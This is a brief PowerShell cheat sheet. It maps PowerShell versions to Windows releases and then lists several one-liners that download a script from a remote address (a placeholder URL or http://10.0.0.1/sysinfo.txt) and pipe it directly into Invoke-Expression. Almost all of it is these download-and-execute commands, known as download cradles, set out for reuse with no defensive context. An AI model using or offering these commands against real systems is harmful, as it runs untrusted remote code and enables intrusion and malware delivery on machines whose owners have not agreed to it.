## Uses for Invoke-Expression en Invoke-WebRequest, Invoke-RestMethod and WebClient

### Powershell Versions
```ps
$PSVersionTable
```
- Powershell 1.0 – Windows Vista / 2008
- Powershell 2.0 – Windows 7 / 2008 R2
- Powershell 3.0 – Windows 8 / 2012
- Powershell 4.0 – Windows 8.1 / 2012 R2
- Powershell 5.0 – Windows 10

### Powershell v1.0/v2.0
```ps
IEX (New-Object Net.WebClient).DownloadString('URL')
```

### Powershell v3.0 and later
```ps
Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
```
```ps
Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt' | IEX
IEX (Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt')
```
```ps
IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
```
```ps
Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
```
```ps
IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing).Content
```